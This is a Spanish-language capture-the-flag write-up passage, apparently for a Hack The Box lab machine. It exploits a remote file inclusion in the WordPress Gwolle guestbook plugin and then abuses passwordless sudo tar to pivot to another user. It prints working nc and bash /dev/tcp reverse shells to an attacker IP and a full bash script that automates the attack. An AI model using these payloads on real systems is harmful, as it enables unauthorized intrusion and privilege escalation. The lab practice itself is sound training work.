## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Entablar una reverse shell desde la vulnerabilidad Gwolle {-}

1. Creamos el fichero `wp-load.php` que contiene

    ```php
    <?php
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f");
    ?>
    ```

1. Montamos un servidor web desde la maquina de atacante

    ```bash
    python3 -m http.server
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Lanzamos la peticion get con curl

    ```bash
    curl -s -X GET "http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/"
    ```

Ya podemos comprobar que estamos dentro de la maquina

```bash
whoami
#Output

www-data

hostname-I
#Output

10.10.10.88
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Analizamos la maquina {-}

```bash
cd /home
ls
cd /onuma

id
sudo -l
#Output

(onuma) NOPASSWD: /bin/tar
```

Aqui vemos que hay un usuario onuma en el directorio home pero no tenemos capacidad de acceso. Tambien vemos que podemos usar 
el comando tar como el usuario **onuma** sin proporcionar contraseña.

### User Pivoting al usuario onuma {-}

Como es posible utilizar el comando tar como el usuario onuma sin propocionar contraseña, vamos a la pagina [GTFOBINS](https://gtfobins.github.io/) y buscamos 
una manera de entablarnos una shell como el usuario onuma

```bash
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
whoami
#Output

onuma
```

Aqui ya podemos ver la flag.

### Automatizamos el acceso en bash {-}

```bash
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo ...\n"
    exit 1
}

# Ctrl+C
trap ctrl_c INT

# ./exploit.sh -u www-data/onuma

function helpPanel(){
    echo -e "\n[!] Uso: $0 -u www-data/onuma\n"
    exit 1
}

function makeWWWDataFile(){
cat << EOF > wp-load.php
<?php
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f");
?>
EOF
}

function makeOnumaFile(){
cat << EOF > wp-load.php
<?php
    system("echo '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.8/443 0>&1' > /dev/shm/s4vishell.sh");
    system("sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=\"bash /dev/shm/s4vishell.sh\"");
?>
EOF
}

function makeRequest(){
    if [ "$(echo $username)" == "www-data" ]; then
        makeWWWDataFile
        python3 -m http.server 80 &>/dev/null &
        curl -s -X GET "http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/"
        rm wp-load.php
        kill -9 $(lsof -i:80 | grep "python" | awk '{print $2}') &>/dev/null
    elif [ "$(echo $username)" == "onuma" ]; then
        makeOnumaFile
        python3 -m http.server 80 &>/dev/null &
        curl -s -X GET "http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/"
        rm wp-load.php
        kill -9 $(lsof -i:80 | grep "python" | awk '{print $2}') &>/dev/null
    else
        echo -e "\n[!] El usuario es invÃ¡lido\n"
        exit 1
    fi
}

declare -i parameter_counter=0; while getopts ":u:h:" arg; do
    case $arg in
        u) username=$OPTARG; let parameter_counter+=1;;
        h) helpPanel;;
    esac
done

if [ $parameter_counter -eq 0 ]; then
    helpPanel
else
    makeRequest
fi
```

Para usar este script, nos tenemos previamente que poner en escucha por el puerto 443 y con otra shell, usar el exploit:

- para acceder a la maquina como el usuario www-data

    ```bash
    ./exploitTheThing.sh -u www-data
    ```

- para acceder a la maquina como el usuario onuma

    ```bash
    ./exploitTheThing.sh -u onuma
    ```



